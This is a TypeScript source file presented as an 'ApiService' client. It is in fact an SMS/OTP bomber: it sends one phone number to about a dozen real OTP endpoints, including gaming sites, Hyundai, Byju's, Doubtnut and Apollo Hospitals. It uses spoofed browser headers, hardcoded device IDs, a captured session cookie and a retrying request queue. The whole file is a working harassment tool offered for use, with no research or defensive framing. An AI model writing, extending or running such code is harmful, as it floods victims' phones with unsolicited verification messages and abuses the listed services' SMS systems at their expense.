interface Endpoint {
    url: string;
    headers: Record<string, string>;
    bodyTemplate: (mobile: string) => string | Record<string, any>;
}
interface ApiResponse {
    url: string;
    success: boolean;
    data?: any;
    error?: string;
}

class ApiService {
    private endpoints: Endpoint[] = [
        {
            url: "https://www.rummycircle.com/api/fl/auth/v3/getOtp",
            headers: {
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.5",
                "cache-control": "max-age=0",
                "content-type": "application/json",
                "priority": "u=1, i",
                "sec-ch-ua": `"Not A(Brand";v="8", "Chromium";v="132", "Brave";v="132"`,
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": `"Windows"`,
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "sec-gpc": "1"
            },
            bodyTemplate: (mobile) => ({
                mobile,
                deviceId: "85049cbb-c796-47e0-bea2-861ec31ff29d",
                deviceName: "",
                refCode: "",
                isPlaycircle: false
            })
        },
        {
            url: "https://pfapi.a23games.in/a23user/signup_by_mobile_otp/v2",
            headers: {
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.7",
                "content-type": "application/json",
                "priority": "u=1, i",
                "sec-ch-ua": `"Not A(Brand";v="8", "Chromium";v="132", "Brave";v="132"`,
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": `"Windows"`,
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "cross-site",
                "sec-gpc": "1",
                "Referer": "https://www.a23.com/",
                "Referrer-Policy": "strict-origin-when-cross-origin"
            },
            bodyTemplate: (mobile) => ({
                channel: "web",
                device_id: "66c2f593-8d53-4b85-9c97-ebd8367eb7d4",
                model: "Google,Android SDK built for x86,10",
                version: "1.0.5",
                mobile: `+91${mobile}`,
                otp: "",
                type: "signup",
                referBy: ""
            })
        },
        {
            url: "https://auth.rummypassion.com/v1/sendAuthOtp.php",
            headers: {
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.8",
                "content-type": "text/plain",
                "priority": "u=1, i",
                "sec-ch-ua": `"Not A(Brand";v="8", "Chromium";v="132", "Brave";v="132"`,
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": `"Windows"`,
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-site",
                "sec-gpc": "1"
            },
            bodyTemplate: (mobile) => ({
                appVersion: "1.2.32",
                applicationType: "webgl",
                contact: mobile,
                apptype: "APK"
            })
        },
        {
            url: "https://www.my11circle.com/api/fl/auth/v3/getOtp",
            headers: {
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.8",
                "cache-control": "max-age=0",
                "content-type": "application/json",
                "priority": "u=1, i",
                "sec-ch-ua": `"Not A(Brand";v="8", "Chromium";v="132", "Brave";v="132"`,
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": `"Windows"`,
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "sec-gpc": "1",
                "Referer": "https://www.my11circle.com/player/login.html",
                "Referrer-Policy": "strict-origin-when-cross-origin"
            },
            bodyTemplate: (mobile) => ({
                mobile,
                deviceId: "796b42a7-437e-4fe8-bab2-c999bd8e81db",
                deviceName: "",
                refCode: "",
                isPlaycircle: false
            })
        },
        {
            url: "https://playerzpot.com/download_link_curl",
            headers: {
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryEUsZIRz1EqzAEpDS",
                "priority": "u=1, i",
                "sec-ch-ua": `"Not A(Brand";v="8", "Chromium";v="132", "Brave";v="132"`,
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": `"Windows"`,
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "sec-gpc": "1",
                "Referer": "https://playerzpot.com/",
                "Referrer-Policy": "strict-origin-when-cross-origin"
            },
            bodyTemplate: (mobile) =>
                `------WebKitFormBoundaryEUsZIRz1EqzAEpDS\\r\\nContent-Disposition: form-data; name=\"mobile_no\"\\r\\n\\r\\n${mobile}\\r\\n------WebKitFormBoundaryEUsZIRz1EqzAEpDS--\\r\\n`
        },
        {
            url: "https://api.hyundai.co.in/service/otp/postGenerateOTPForMobile",
            headers: {
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.8",
                "content-type": "application/json",
                "priority": "u=1, i",
                "sec-ch-ua": `"Not A(Brand";v="8", "Chromium";v="132", "Brave";v="132"`,
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": `"Windows"`,
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "cross-site",
                "Referer": "https://www.hyundai.com/",
                "Referrer-Policy": "strict-origin-when-cross-origin"
            },
            bodyTemplate: (mobile) => ({
                mobileNo: mobile,
                source: "Web Exit"
            })
        },
        {
            url: "https://api.doubtnut.com/v4/student/login",
            headers: {
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "priority": "u=1, i",
                "sec-ch-ua": `"Not A(Brand";v="8", "Chromium";v="132", "Brave";v="132"`,
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": `"Windows"`,
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-site",
                "sec-gpc": "1",
                "version_code": "1500",
                "Referer": "https://www.doubtnut.com/",
                "Referrer-Policy": "strict-origin-when-cross-origin"
            },
            bodyTemplate: (mobile) => ({
                phone_number: mobile,
                is_web: "3"
            })
        },
        {
            url: "https://identity.tllms.com/api/request_otp",
            headers: {
                "accept": "application/json, text/plain, */*",
                "accept-language": "en-US,en;q=0.7",
                "content-type": "application/json",
                "priority": "u=1, i",
                "sec-ch-ua": `"Not A(Brand";v="8", "Chromium";v="132", "Brave";v="132"`,
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": `"Windows"`,
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "cross-site",
                "sec-gpc": "1",
                "Referer": "https://byjus.com/",
                "Referrer-Policy": "strict-origin-when-cross-origin"
            },
            bodyTemplate: (mobile) => ({
                phone: `+91-${mobile}`,
                app_client_id: "90391da1-ee49-4378-bd12-1924134e906e"
            })
        },
        {
            url: "https://www.getrushapp.com/send-sms",
            headers: {
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "priority": "u=1, i",
                "sec-ch-ua": `"Not A(Brand";v="8", "Chromium";v="132", "Brave";v="132"`,
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": `"Windows"`,
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "sec-gpc": "1",
                "Referer": "https://www.getrushapp.com/casual-games/ludo-game-online",
                "Referrer-Policy": "strict-origin-when-cross-origin"
            },
            bodyTemplate: (mobile) => ({
                msisdn: mobile,
                env: "production"
            })
        },
        {
            url: "https://playerzpot.com/download_link_curl",
            headers: {
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.8",
                "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryE4dAWx4q80qCFAO0",
                "priority": "u=1, i",
                "sec-ch-ua": `"Not A(Brand";v="8", "Chromium";v="132", "Brave";v="132"`,
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": `"Windows"`,
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "sec-gpc": "1",
                "Referer": "https://playerzpot.com/games/board/download-ludo-app",
                "Referrer-Policy": "strict-origin-when-cross-origin"
            },
            bodyTemplate: (mobile) =>
                `------WebKitFormBoundaryE4dAWx4q80qCFAO0\r\nContent-Disposition: form-data; name="mobile_no"\r\n\r\n${mobile}\r\n------WebKitFormBoundaryE4dAWx4q80qCFAO0--\r\n`
        },
        {
            url: "https://www.apollohospitals.com/wp-admin/admin-ajax.php",
            headers: {
                accept: "application/json, text/javascript, */*; q=0.01",
                "accept-language": "en-US,en;q=0.8",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "priority": "u=1, i",
                "sec-ch-ua": `"Not A(Brand";v="8", "Chromium";v="132", "Brave";v="132"`,
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": `"Windows"`,
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "sec-gpc": "1",
                "x-requested-with": "XMLHttpRequest",
                "cookie":
                    "ApplicationGatewayAffinityCORS=61ca6572ed634dc0505c9389bcc8fdd6; ApplicationGatewayAffinity=61ca6572ed634dc0505c9389bcc8fdd6; INGRESSCOOKIE=1737387100.08.438.66854|d1b5e19aa101484e5efbf2bab829a68e",
                "Referer": "https://www.apollohospitals.com/",
                "Referrer-Policy": "strict-origin-when-cross-origin"
            },
            bodyTemplate: (mobile) =>
                `action=ajax_send_otp_verification_2&lead_phone=${mobile}`
        }
    ];

    private queue: Array<() => Promise<void>> = [];
    private isProcessing = false;
    private readonly delayBetweenRequests = 500;
    private readonly maxRetries = 2;
    private readonly requestTimeout = 500;

    private async processQueue(): Promise<void> {
        if (this.isProcessing || this.queue.length === 0) return;
        this.isProcessing = true;

        while (this.queue.length > 0) {
            const request = this.queue.shift();
            if (request) {
                await request();
                await new Promise(resolve => setTimeout(resolve, this.delayBetweenRequests));
            }
        }

        this.isProcessing = false;
    }

    private async makeRequest(
        endpoint: Endpoint,
        mobile: string,
        retryCount = 0
    ): Promise<ApiResponse> {
        try {
            const body = typeof endpoint.bodyTemplate === "function"
                ? JSON.stringify(endpoint.bodyTemplate(mobile))
                : endpoint.bodyTemplate;

            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), this.requestTimeout);

            const response = await fetch(endpoint.url, {
                method: "POST",
                headers: endpoint.headers,
                body,
                signal: controller.signal
            });

            clearTimeout(timeoutId);
            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            }

            const data = await response.json();
            return {
                url: endpoint.url,
                success: true,
                data
            };
        } catch (error) {
            if (error instanceof TypeError && error.message === "Failed to fetch") {
                if (retryCount < this.maxRetries) {
                    console.log(`Retrying request to ${endpoint.url}, attempt ${retryCount + 1}`);
                    await new Promise(resolve => setTimeout(resolve, 2000 * (retryCount + 1)));
                    return this.makeRequest(endpoint, mobile, retryCount + 1);
                }
            }

            return {
                url: endpoint.url,
                success: false,
                error: error instanceof Error ? error.message : 'Unknown error occurred'
            };
        }
    }

    async send(mobile: string): Promise<ApiResponse[]> {
        const results: ApiResponse[] = [];

        this.endpoints.forEach(endpoint => {
            this.queue.push(async () => {
                const result = await this.makeRequest(endpoint, mobile);
                results.push(result);
                console.log(`Response from ${endpoint.url}:`, result);
            });
        });

        await this.processQueue();

        return results;
    }
}

export const apiService = new ApiService();
